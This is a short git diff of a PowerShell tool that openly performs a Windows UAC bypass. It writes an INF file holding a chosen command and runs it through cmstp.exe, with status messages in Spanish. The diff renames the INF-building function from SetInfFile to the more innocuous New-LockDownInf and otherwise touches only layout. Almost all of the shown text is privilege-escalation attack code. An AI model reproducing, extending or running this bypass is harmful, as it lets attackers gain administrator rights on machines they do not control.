@@ -6,7 +6,7 @@ chcp 65001 > $null
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 $OutputEncoding           = [System.Text.Encoding]::UTF8
 
-Function SetInfFile($CommandToExecute) {
+Function New-LockDownInf($CommandToExecute) {
     $localAppData = [Environment]::GetFolderPath("LocalApplicationData")
     
     if ($CommandToExecute -like "*powershell.exe*" -and $CommandToExecute -notlike "*EncodedCommand*") {
@@ -70,7 +70,7 @@ Function Execute-UACBypass($CommandToExecute) {
     try {
         Write-Host "[+] Iniciando UAC Bypass..." -ForegroundColor Yellow
         
-        $infPath = SetInfFile($CommandToExecute)
+        $infPath = New-LockDownInf($CommandToExecute)
         
         Write-Host "[+] Ejecutando cmstp.exe..." -ForegroundColor Yellow
         $s = New-Object System.Diagnostics.ProcessStartInfo
@@ -555,3 +555,4 @@ do {
     }
 
 } while ($true)
+
